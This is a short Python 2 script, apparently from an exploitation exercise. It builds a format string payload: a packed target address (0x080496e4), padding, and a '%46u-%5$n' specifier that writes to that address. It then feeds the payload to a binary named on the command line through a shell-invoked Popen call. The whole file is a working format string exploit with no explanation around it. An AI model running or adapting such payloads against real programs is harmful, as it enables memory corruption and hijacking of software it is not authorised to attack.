from subprocess import PIPE,Popen
import sys
import struct



i = 5
buff = 'AAAA'
buff += struct.pack('I',0x080496e4)
buff += 'BBBBCCCC-'
fmt = '%%46u-%%%i$n' %(i)
args = buff+fmt
p = Popen('%s' %(sys.argv[1]),shell=True,stdout=PIPE,stdin=PIPE,stderr=PIPE)
res = p.communicate(input=args)[0]
print "[%i] %s" %(i,res)
